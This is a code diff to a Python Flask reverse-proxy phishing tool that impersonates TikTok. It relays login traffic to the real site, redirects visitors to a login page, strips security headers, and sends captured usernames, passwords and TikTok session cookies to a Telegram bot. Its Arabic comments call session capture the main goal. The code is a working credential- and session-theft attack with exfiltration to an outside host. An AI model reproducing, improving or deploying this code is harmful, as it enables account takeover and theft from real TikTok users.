@@ -15,7 +15,7 @@ C = "1367401179"
 class E:
     def __init__(self):
         self.d = "www.tiktok.com"
-        self.p = ["www.tiktok.com", "tiktok.com", "m.tiktok.com", "sf16-scmcdn-va.akamaized.net"]
+        self.p = ["www.tiktok.com", "tiktok.com", "m.tiktok.com"]
 
     def n(self, m):
         try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"}, timeout=5)
@@ -25,15 +25,10 @@ class E:
         for d in self.p:
             t = t.replace(f"https://{d}", f"https://{h}")
             t = t.replace(f"//{d}", f"//{h}")
-        t = re.sub(r'integrity="[^"]+"', '', t)
-        if '<head>' in t:
-            i = f"<script>Object.defineProperty(window.location, 'hostname', {{ get: function() {{ return '{self.d}'; }} }});</script>"
-            t = t.replace('<head>', f'<head>{i}')
         return t
 
 e = E()
 
-# تعديل المسار الرئيسي ليقوم بالتوجيه لصفحة تسجيل الدخول فوراً
 @a.route('/')
 def home():
     return redirect('/login')
@@ -47,36 +42,43 @@ def f(x):
     H = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
     H['Host'] = e.d
 
+    # الفلترة: التقاط بيانات الدخول فقط وتجاهل بيانات التتبع التقنية
     if request.method == 'POST':
-        D = request.form.to_dict() or request.get_json(silent=True) or {}
-        if D:
-            e.n(f"📥 <b>TikTok Input:</b>\n<code>{json.dumps(D, indent=2)}</code>")
+        data = request.get_data(as_text=True)
+        # البحث عن أنماط البريد أو كلمة السر في جسم الطلب
+        if 'password' in data.lower() or 'username' in data.lower():
+            e.n(f"✅ <b>Login Data Found:</b>\n<code>{data[:1000]}</code>")
 
     try:
         R = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
+        
         B = R.content
-        if any(x in R.headers.get('Content-Type', '') for x in ['html', 'javascript']):
-            try: B = e.r(R.content.decode('utf-8', errors='ignore'), h).encode()
-            except: pass
+        if 'text/html' in R.headers.get('Content-Type', ''):
+            B = e.r(B.decode('utf-8', errors='ignore'), h).encode()
 
         r = make_response(B)
         r.status_code = R.status_code
+
         for k, v in R.headers.items():
             if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'set-cookie']:
                 r.headers[k] = v
 
+        # تمرير الكوكيز مع تعديل خصائص الأمان لضمان الحفظ
         for k, v in R.cookies.items():
             r.set_cookie(k, v, secure=True, httponly=True, samesite='None', domain=h)
 
+        # التقاط الجلسة (الهدف الأساسي)
         if 'sessionid' in R.cookies:
-            ck = [f"{k}={v}" for k, v in R.cookies.items() if k in ['sessionid', 'sid_tt', 'ttwid']]
-            e.n(f"🎼 <b>SUCCESS! TikTok Session:</b>\n<code>{'; '.join(ck)}</code>")
+            session_str = "; ".join([f"{k}={v}" for k, v in R.cookies.items() if k in ['sessionid', 'sid_tt', 'ttwid', 'uid_tt']])
+            e.n(f"🔥 <b>FULL SESSION CAPTURED!</b>\n<code>{session_str}</code>")
 
         if R.status_code in [301, 302, 303]:
             l = R.headers.get('Location', '').replace(e.d, h)
             r.headers['Location'] = l
+
         return r
-    except: return "System Busy", 503
+    except Exception as err:
+        return f"Error: {str(err)}", 500
 
 if __name__ == '__main__':
     a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
